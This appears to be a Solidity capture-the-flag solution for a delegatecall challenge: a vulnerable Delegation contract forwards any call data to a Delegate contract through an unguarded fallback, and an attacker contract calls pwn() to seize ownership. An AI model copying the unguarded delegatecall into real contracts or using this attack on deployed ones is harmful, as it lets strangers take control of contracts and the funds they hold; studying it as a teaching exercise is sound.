// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {
    address public owner;

    constructor(address _owner) public {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract DelegateCall {
    Delegation delegation;

    function setDelegation(address _delegation) external {
        delegation = Delegation(_delegation);
    }

    function getOwnership() public {
        // call a non existing pwn() function in Delegation will trigger fallback which will delegatecall using msg.data to Delegate
        address(delegation).call(abi.encodeWithSignature("pwn()"));
    }
}